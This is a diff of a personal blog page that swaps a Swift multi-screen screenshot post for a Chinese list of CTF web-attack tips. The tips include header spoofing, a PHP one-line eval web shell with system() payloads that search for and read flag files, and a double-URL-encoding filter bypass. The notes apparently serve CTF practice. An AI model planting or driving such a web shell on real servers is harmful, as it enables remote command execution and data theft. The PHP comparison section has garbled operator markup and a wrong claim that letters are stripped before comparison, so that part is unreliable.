@@ -4,7 +4,7 @@
 <meta name="description" content=""/>
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
 
-<title>Clipin Log 6. 多屏幕支持 | Hagemon&#39;s Log</title>
+<title>网络攻防tips | Hagemon&#39;s Log</title>
 
 <link rel="shortcut icon" href="https://hagemon.github.io/favicon.ico?v=1623420267034">
 
@@ -89,103 +89,46 @@
         <div class="post-detail gt-bg-theme-color-second">
             <article class="gt-post-content">
                 <h2 class="post-title">
-                    Clipin Log 6. 多屏幕支持
+                    网络攻防tips
                 </h2>
                 <div class="post-info">
                     <time class="post-time gt-c-content-color-first">
-                        · 2021-01-09 ·
+                        · 2021-06-10 ·
                     </time>
-                    
-                        <a href="https://hagemon.github.io/tag/5hne80IJu/" class="post-tags">
-                            # iOS
-                        </a>
-                    
-                        <a href="https://hagemon.github.io/tag/VavrNj5esO/" class="post-tags">
-                            # Clipin
-                        </a>
                     
                 </div>
                 <div class="post-content">
-                    <h2 id="多屏幕环境">多屏幕环境</h2>
-<p>在多屏幕环境下，各个屏幕的起始坐标<code>origin</code>会根据用户在系统偏好设置中对显示器排列的设置而不同，下图直观地表示了多屏幕环境下各屏幕的坐标。</p>
-<figure data-type="image" tabindex="1"><img src="https://hagemon.github.io/post-images/1613224003347.png" alt="" loading="lazy"></figure>
-<p>通过<code>screen.visibleFrame</code>可以访问屏幕在此坐标系下的frame。</p>
-<h2 id="实现思路">实现思路</h2>
-<ul>
-<li>在ClipManager.shared.start()中检测所有屏幕并创建控制器</li>
-<li>对于每个控制器，获取对应显示器当前页面图像</li>
-<li>在执行Pin操作时，需要将窗口偏移到正确的位置</li>
-</ul>
-<pre><code class="language-swift">class ClipManager {
-	// ....    
-    var controllers: [ClipWindowController] = []
-    // ....
-    func start() {
-        NotificationCenter.default.post(name: NotiNames.pinNormal.name, object: nil)
-        NSApplication.shared.activate(ignoringOtherApps: true)
-        
-        for screen in NSScreen.screens {  // 获取所有屏幕
-            let view = ClipView(frame: screen.frame)
-            let clipWindow = ClipWindow(contentRect: screen.frame, contentView: view)
-            let clipWindowController = ClipWindowController(window: clipWindow)
-            controllers.append(clipWindowController)
-            self.status = .ready
-            clipWindowController.capture(screen)
-        }
-
-    }
-    
-    // ....
-}
+                    <p>记录一些网络攻防题中的小tips。</p>
+<h1 id="robots">Robots</h1>
+<p>每个网站有一个robots.txt用于防爬虫。</p>
+<h1 id="bp构造post请求">BP构造POST请求</h1>
+<p>在BP中可以在header里添加<code>Content-type: application/x-www-form-urlencoded</code>，并在最后添加参数构造POST请求</p>
+<h1 id="伪造请求">伪造请求</h1>
+<p>在header中添加x-forwarded-for: xxx.xxx.xxx.xxx，以及referer: https://www.google.com 来伪造请求。</p>
+<h1 id="一句话木马">一句话木马</h1>
+<p>当一句话木马在服务器上时：</p>
+<pre><code class="language-php">&lt;?php @eval($_POST['shell']);?&gt;
 </code></pre>
-<p>在ClipWindowController中获取各屏幕的图像：</p>
-<pre><code class="language-swift">class ClipWindowController: NSWindowController {
-	func capture(_ screen:NSScreen) {
-        guard let window = self.window else { return }
-        //  获取screen对应的displayID和ID对应的图像
-        guard let displayID = screen.deviceDescription[NSDeviceDescriptionKey(rawValue: &quot;NSScreenNumber&quot;)] as? CGDirectDisplayID,
-                let cgScreenImage = CGDisplayCreateImage(displayID)
-        else { return }
-        self.screenImage = NSImage(cgImage: cgScreenImage, size: screen.frame.size)
-        window.backgroundColor = NSColor(white: 0, alpha: 0.5)
-        self.clipView = window.contentView as? ClipView
-        self.showWindow(nil)
-    }
-}
+<p>将请求构造为POST，且将参数设置为</p>
+<pre><code>shell=system(&quot;find / -name 'flag*'&quot;);
 </code></pre>
-<p>在PinManager中修改pin函数，将屏幕起始坐标增加为新的参数，并对pin窗口进行偏移：</p>
-<pre><code class="language-swift">class PinManager: NSObject {
-	func pin(rep: NSBitmapImageRep, rect:NSRect, screenOrigin:NSPoint) {
-        let image = NSImage(size: rect.size)
-        image.addRepresentation(rep)
-        let view = PinView(image: image)
-        let window = PinWindow(rect: rect, contentView: view)
-        let controller = PinWindowController(window: window)
-        self.controllers.append(controller)
-        // 以屏幕左下角坐标为基准，偏移pin窗口
-        window.setFrameOrigin(screenOrigin.offsetBy(dx: rect.origin.x, dy: rect.origin.y))
-        controller.showWindow(nil)
-        NotificationCenter.default.post(name: NotiNames.pinEnd.name, object: nil)
-    }
-}
+<pre><code>shell=system('cat flag.txt');
 </code></pre>
-<p>同时在调用pin函数时增加对屏幕起始坐标参数的传入：</p>
-<pre><code class="language-swift">// ClipWindowController.swift
-@objc func done() {
-    guard let view = self.clipView,
-          let rect = view.drawingRect
-    else {
-        return
-    }
-    guard let bitmapRep = view.bitmapImageRepForCachingDisplay(in: rect),
-          let window = self.window,
-          let screen = window.screen
-    else {return}
-    view.cacheDisplay(in: rect, to: bitmapRep)
-    PinManager.shared.pin(rep: bitmapRep, rect: rect, screenOrigin: screen.visibleFrame.origin)
-}
+<h1 id="的解码">?的解码</h1>
+<p>问号的URL编码为%3f，浏览器会讲%3f解码为问号。如果服务端对问号有一次解码校验的过程：</p>
+<pre><code class="language-php">&lt;?php
+url_decode($param);
+?&gt;
 </code></pre>
-<p>接下来是<a href="https://hagemon.github.io/post/clipin-post-7/">对截屏的一些优化</a></p>
+<p>则可以先将%3f编码，即%253f。浏览器会现将%253f解码为%3f，这样就可以绕过服务端的问号校验（服务端收到的就是%3f而不是？）。</p>
+<h1 id="php中的比较">PHP中的比较</h1>
+<p>PHP中<mark>会先强制转化类型再比较值，而</mark>=则会比较类型和值。</p>
+<pre><code class="language-php">&lt;?php
+$a = 'a1234';
+$a == 1234; # 在比较时会去掉字母
+$b = 'abc';
+$b == 0; # 比较时会去掉字母
+&gt;```</code></pre>
 
                 </div>
             </article>
@@ -194,8 +137,8 @@
         
             <div class="next-post">
                 <div class="next gt-c-content-color-first">下一篇</div>
-                <a href="https://hagemon.github.io/post/clipin-log-5/" class="post-title gt-a-link">
-                    Clipin Log 5. 单屏幕Pin实现
+                <a href="https://hagemon.github.io/post/vPveeHeQA/" class="post-title gt-a-link">
+                    优化问题中的矩阵运算
                 </a>
             </div>
         
